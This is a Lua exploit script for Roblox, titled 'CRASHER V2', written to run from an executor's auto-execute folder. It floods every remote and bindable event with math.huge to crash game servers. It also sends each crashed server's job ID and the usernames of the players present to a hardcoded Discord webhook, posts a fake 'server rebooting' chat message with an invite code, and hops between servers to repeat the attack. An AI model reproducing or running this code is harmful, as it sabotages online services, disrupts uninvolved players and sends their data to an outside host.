-- place script in auto execute folder it server hop for more chance of crashing the server (rebooting it)
-- CRASHER V2
game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("SERVER REBOOTING FOR UPDATE WARNING JOIN cBKaHEGptc - TEAM HAXA")
task.wait()
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local JobId = game.JobId
local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local lp = game.Players.LocalPlayer
local Def = "leBotDeRoblox_"
local max
local min
if lp.Name == tostring(Def.."1") then
  max = 19
  min = 17
elseif lp.Name == tostring(Def.."2") then
  max = 17
  min = 14
elseif lp.Name == tostring(Def.."3") then
  max = 14
  min = 12
elseif lp.Name == tostring(Def.."4") then
  max = 12
  min = 10
elseif lp.Name == tostring(Def.."7") then
max = 19
min = 10
end
local MMAX = math.random(min, max)
--local max = math.random(10, 19)
local settings = 4 -- best


for i = 1, 5 do
    -- Start
    for p, v in pairs(game:GetDescendants()) do
        coroutine.wrap(function()
            local success, err = pcall(function()
                if v:IsA("RemoteFunction") then
                    v:InvokeServer(math.huge)
                elseif v:IsA("RemoteEvent") then
                    v:FireServer(math.huge)
                elseif v:IsA("BindableEvent") and v ~= Players.LocalPlayer.PlayerGui.Intro.LocalScript:FindFirstChild("DoTutorial") then
                    v:Fire(game.Players.LocalPlayer, math.huge)
                end
            end)
            if not success then
                warn(":neutral-face: " .. err)
            end
        end)()
    end
    
    task.wait(settings)
    coroutine.wrap(function()
        local HttpService = game:GetService("HttpService")
        local players = {}
    
        for _, player in ipairs(game.Players:GetPlayers()) do
            table.insert(players, player.Name)
        end
    
        local content = "ðŸš¨ SERVER CRASHED ðŸš¨\n"
        content = content .. "ðŸ†” Job ID: `" .. game.JobId .. "`\n"
        content = content .. "ðŸ‘¥ Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
        content = content .. "ðŸ‘¥ Players: `" .. table.concat(players, ", ") .. "`"
    
        http.request({
            Url = "https://discord.com/api/webhooks/1368622410416263260/Q3d_YET9sxYsnoYvmvnOGtZRR6F8QwrPYeBo-M41UO_qJpteYspR4detWaCy-z-M8zyf",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone " .. content,
                username = game.Players.LocalPlayer.Name or "Crash Logger"
            })
        })
    end)()
    
    local function HOPPING()
    if httprequest then
        local servers = {}
        local cursor = nil
        local foundServer = false

        repeat
            local url = string.format(
                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true%s",
                PlaceId,
                cursor and ("&cursor=" .. cursor) or ""
            )

            local success, req = pcall(function()
                return httprequest({ Url = url })
            end)

            if success and req then
                local body = HttpService:JSONDecode(req.Body)
                if body and body.data then
                    for _, a in pairs(body.data) do
                        if type(a) == "table" and tonumber(a.playing) and tonumber(a.maxPlayers) and a.playing >= min and a.playing <= max and a.id ~= JobId then
                            table.insert(servers, a.id)
                        end
                    end
                end

                cursor = body.nextPageCursor
            else
                warn("HTTP Request Error: " .. (req or "No response"))
                break
            end

        until not cursor or #servers >= 50

        if #servers > 0 then
            local success, err = pcall(function()
                TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
            end)
            if not success then
                warn("Teleportation failed: " .. err)
                task.delay(2,HOPPING)
            end
        else
            warn("No suitable servers found.")
            task.delay(4,HOPPING)
        end
    end
end


HOPPING()
